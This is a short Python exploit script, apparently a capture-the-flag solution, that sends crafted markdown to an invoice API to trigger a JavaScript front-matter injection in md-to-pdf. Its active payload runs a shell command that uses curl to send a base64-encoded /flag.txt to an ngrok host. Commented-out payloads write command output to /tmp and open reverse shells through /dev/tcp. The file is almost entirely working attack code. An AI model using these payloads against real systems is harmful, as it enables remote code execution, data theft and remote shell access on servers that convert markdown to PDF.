import requests

BASE_URL = "http://167.172.56.180:32024"
# BASE_URL = "http://localhost:1337"
API_URL = f"{BASE_URL}/api"

PAYLOADS = [
    # '---js\n((require("child_process")).execSync("id > /tmp/RCE.txt"))\n---RCE', # https://github.com/simonhaenisch/md-to-pdf/issues/99
    '---js\n((require("child_process")).execSync("curl http://1de3-82-55-253-77.ngrok.io/$(cat /flag.txt | base64)"))\n---RCE',
    # '---jsn((require("child_process")).execSync("sh -i >& /dev/tcp/localhost/3333 0>&1"))n---RCE',
    # '---jsn((require("child_process")).execSync("/bin/sh -i >& /dev/tcp/localhost/3333 0>&1"))n---RCE'
]

for p in PAYLOADS:
    r = requests.post(f"{API_URL}/invoice/add", json={"markdown_content": p})
    print(r.status_code, r.text)

# r = requests.get(f"{API_URL}/invoice/list")
